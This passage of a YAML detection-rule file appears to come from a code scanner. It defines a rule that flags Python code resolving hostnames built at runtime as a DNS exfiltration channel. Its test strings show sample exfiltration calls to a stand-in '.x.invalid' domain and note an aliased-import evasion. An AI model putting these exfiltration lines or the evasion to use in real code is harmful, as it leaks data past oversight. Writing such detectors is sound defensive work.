        - "model.node()"

  - id: CAP.EGRESS.DNS_CONSTRUCTED.AST.001
    version: 1.0.0
    category: policy
    severity: info
    confidence: high
    capability: egress
    title: Resolves a hostname built at runtime, through whatever name it was given
    message: >
      This file resolves a name it assembles rather than one it writes. DNS is
      a channel: the label is the payload and the query leaves whether or not
      anything answers. Resolved from the parsed source, so aliasing the socket
      import -- `import socket as s; s.gethostbyname(blob + ".x.invalid")` --
      does not hide it, which is the exact evasion the byte pattern keyed to
      `socket.gethostbyname` misses.
    remediation: >
      Resolve names that appear in source or configuration, not ones built from
      program data at runtime.
    languages: [python]
    match:
      kind: ast
      calls:
        - socket.gethostbyname
        - socket.gethostbyname_ex
        - socket.getaddrinfo
      # As precise as the regex `CAP.EGRESS.DNS_CONSTRUCTED.001`: the argument
      # must be BUILT, never a plain host written in the source. This is what
      # keeps it from firing on ordinary diagnostic code that resolves a fixed
      # name, so it can safely be an alternative in the DNS-exfil composite.
      argument_constructed: true
    tests:
      positive:
        - "import socket\nsocket.gethostbyname(blob + '.x.invalid')"
        - "import socket as s\ns.gethostbyname(blob[0:60] + '.x.invalid')"
        - "from socket import getaddrinfo as g\ng(f'{data}.x.invalid')"
      negative:
        - "import socket\nsocket.gethostbyname('api.example.com')"
        - "import socket\nsocket.gethostbyname(host)"
        - "self.gethostbyname(x + y)"
